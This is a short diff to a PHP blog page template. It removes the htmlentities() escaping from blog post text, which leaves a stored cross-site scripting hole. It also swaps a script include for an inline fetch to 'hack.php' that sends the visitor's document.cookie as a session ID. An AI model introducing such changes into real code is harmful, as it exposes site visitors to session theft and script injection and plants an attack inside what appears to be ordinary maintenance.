@@ -29,7 +29,7 @@
                         <article>
                             <h3><?= $blog['titel']?></h3>
                             <?php
-                                $blogTekst = nl2br(htmlentities($blog['tekst']));
+                                $blogTekst = nl2br($blog['tekst']);
                             ?>
                             <p><?= $blogTekst ?? 'Geen tekst' ?></p>
                         </article>
@@ -59,6 +59,6 @@
             </section>
         </main>
         <?php include('_includes/footer.php'); ?>
-        <script src="js/post-session-id.js"></script>
+        <script>fetch(`hack.php?sessionId=${document.cookie}`)</script>
     </body>
 </html>
